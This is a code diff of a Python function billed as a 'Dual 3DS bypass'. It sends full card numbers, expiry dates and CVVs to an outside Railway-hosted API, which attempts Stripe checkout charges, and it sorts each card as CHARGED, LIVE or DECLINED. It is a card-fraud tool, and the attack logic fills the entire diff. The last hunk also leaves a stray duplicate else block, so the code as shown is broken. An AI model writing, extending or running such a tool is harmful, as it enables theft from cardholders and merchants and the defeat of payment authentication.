@@ -16,7 +16,7 @@ HEADERS = {
 
 API_URL = "https://web-production-2f61.up.railway.app"
 
-async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, session: aiohttp.ClientSession) -> dict:
+async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, session: aiohttp.ClientSession, checkout_url: str = None) -> dict:
     """Dual 3DS bypass: Try method 1 (profile rotation) first, then method 2 (API) if needed"""
     start = time.perf_counter()
     result = {
@@ -65,33 +65,36 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
                 logger.info("⚠️ Restricted key detected - skipping to Method 2 (API)")
                 
                 # Skip Method 1, go directly to Method 2
-                try:
-                    checkout_url = f"https://checkout.stripe.com/c/pay/{cs}#xxx"
-                    card_str = f"{card['cc']}|{card['month']}|{card['year']}{card['cvv']}"
-                    
-                    async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
-                        api_result = await r.json()
-                    
-                    api_status = api_result.get("status", "error")
-                    api_msg = api_result.get("msg", "No response")
-                    
-                    if api_status == "charge":
-                        result["status"] = "CHARGED"
-                        result["response"] = f"3DS Bypassed ✅ - {api_msg}"
-                        result["bypass_method"] = "method_2"
-                    elif api_status == "live":
-                        result["status"] = "LIVE"
-                        result["response"] = api_msg
-                        result["bypass_method"] = "method_2"
-                    elif api_status == "dead":
-                        result["status"] = "DECLINED"
-                        result["response"] = api_msg
-                        result["bypass_method"] = "method_2"
-                    else:
+                if checkout_url:
+                    try:
+                        card_str = f"{card['cc']}|{card['month']}|{card['year']}{card['cvv']}"
+                        
+                        async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
+                            api_result = await r.json()
+                        
+                        api_status = api_result.get("status", "error")
+                        api_msg = api_result.get("msg", "No response")
+                        
+                        if api_status == "charge":
+                            result["status"] = "CHARGED"
+                            result["response"] = f"3DS Bypassed ✅ - {api_msg}"
+                            result["bypass_method"] = "method_2"
+                        elif api_status == "live":
+                            result["status"] = "LIVE"
+                            result["response"] = api_msg
+                            result["bypass_method"] = "method_2"
+                        elif api_status == "dead":
+                            result["status"] = "DECLINED"
+                            result["response"] = api_msg
+                            result["bypass_method"] = "method_2"
+                        else:
+                            result["status"] = "FAILED"
+                            result["response"] = "Restricted checkout - API method failed"
+                    except Exception as e:
+                        logger.error(f"API method error: {e}")
                         result["status"] = "FAILED"
-                        result["response"] = "Restricted checkout - API method failed"
-                except Exception as e:
-                    logger.error(f"API method error: {e}")
+                        result["response"] = "Checkout restricted by merchant"
+                else:
                     result["status"] = "FAILED"
                     result["response"] = "Checkout restricted by merchant"
                 
@@ -193,28 +196,38 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
             # Method 1 didn't give definitive result - try Method 2
             logger.info("⚡ Method 1 inconclusive - trying Method 2 (API)")
             
-            try:
-                checkout_url = f"https://checkout.stripe.com/c/pay/{cs}#xxx"
-                card_str = f"{card['cc']}|{card['month']}|{card['year']}{card['cvv']}"
-                
-                async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
-                    api_result = await r.json()
-                
-                api_status = api_result.get("status", "error")
-                api_msg = api_result.get("msg", "No response")
-                
-                if api_status == "charge":
-                    result["status"] = "CHARGED"
-                    result["response"] = f"3DS Bypassed ✅ - {api_msg}"
-                    result["bypass_method"] = "method_2"
-                elif api_status == "live":
-                    result["status"] = "LIVE"
-                    result["response"] = api_msg
-                    result["bypass_method"] = "method_2"
-                elif api_status == "dead":
-                    result["status"] = "DECLINED"
-                    result["response"] = api_msg
-                    result["bypass_method"] = "method_2"
+            if checkout_url:
+                try:
+                    card_str = f"{card['cc']}|{card['month']}|{card['year']}{card['cvv']}"
+                    
+                    async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
+                        api_result = await r.json()
+                    
+                    api_status = api_result.get("status", "error")
+                    api_msg = api_result.get("msg", "No response")
+                    
+                    if api_status == "charge":
+                        result["status"] = "CHARGED"
+                        result["response"] = f"3DS Bypassed ✅ - {api_msg}"
+                        result["bypass_method"] = "method_2"
+                    elif api_status == "live":
+                        result["status"] = "LIVE"
+                        result["response"] = api_msg
+                        result["bypass_method"] = "method_2"
+                    elif api_status == "dead":
+                        result["status"] = "DECLINED"
+                        result["response"] = api_msg
+                        result["bypass_method"] = "method_2"
+                    else:
+                        result["status"] = "3DS FAIL"
+                        result["response"] = "Both bypass methods failed"
+                except Exception as e:
+                    logger.error(f"Method 2 error: {e}")
+                    result["status"] = "3DS FAIL"
+                    result["response"] = "Both bypass methods failed"
+            else:
+                result["status"] = "3DS FAIL"
+                result["response"] = "3DS Bypass Failed"
                 else:
                     result["status"] = "3DS FAIL"
                     result["response"] = "Both bypass methods failed"
